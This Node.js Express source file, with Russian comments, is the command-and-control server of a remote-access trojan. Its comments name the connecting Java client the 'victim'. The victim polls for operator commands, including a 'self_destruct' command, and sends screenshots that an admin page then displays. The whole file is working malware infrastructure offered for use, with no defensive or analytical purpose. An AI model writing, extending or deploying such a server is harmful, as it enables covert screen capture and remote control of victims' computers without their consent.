const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

// Настройка лимитов для приема скриншотов
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(bodyParser.json({ limit: '50mb' }));

// Хранилище в памяти
let lastCommand = "none";
let lastScreen = "";
let victimInfo = "Ожидание подключения...";

// ГЛАВНАЯ СТРАНИЦА (Админка)
// Мы используем абсолютный путь, чтобы Render не тупил
app.get('/', (req, res) => {
    res.sendFile(path.resolve(__dirname, 'index.html'));
});

// РУЧКА ДЛЯ ЖЕРТВЫ (Java Client)
app.get('/get-command', (req, res) => {
    res.set('Content-Type', 'text/plain');
    res.send(lastCommand);
    if (lastCommand === "self_destruct") lastCommand = "none";
});

// РУЧКА ДЛЯ АДМИНКИ (Кнопки)
app.get('/set-command', (req, res) => {
    const cmd = req.query.cmd;
    if (cmd) {
        lastCommand = cmd;
        res.send("Команда обновлена на: " + cmd);
    } else {
        res.status(400).send("No command provided");
    }
});

// ПРИЕМ СКРИНШОТА
app.post('/upload-screen', (req, res) => {
    if (req.body.img) {
        lastScreen = req.body.img;
        victimInfo = `Online - ${new Date().toLocaleTimeString()}`;
        res.sendStatus(200);
    } else {
        res.sendStatus(400);
    }
});

// ОТДАЧА СКРИНШОТА НА САЙТ
app.get('/get-screen', (req, res) => {
    res.send(lastScreen);
});

// ЗАПУСК
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`SERVER IS ACTIVE ON PORT ${PORT}`);
});
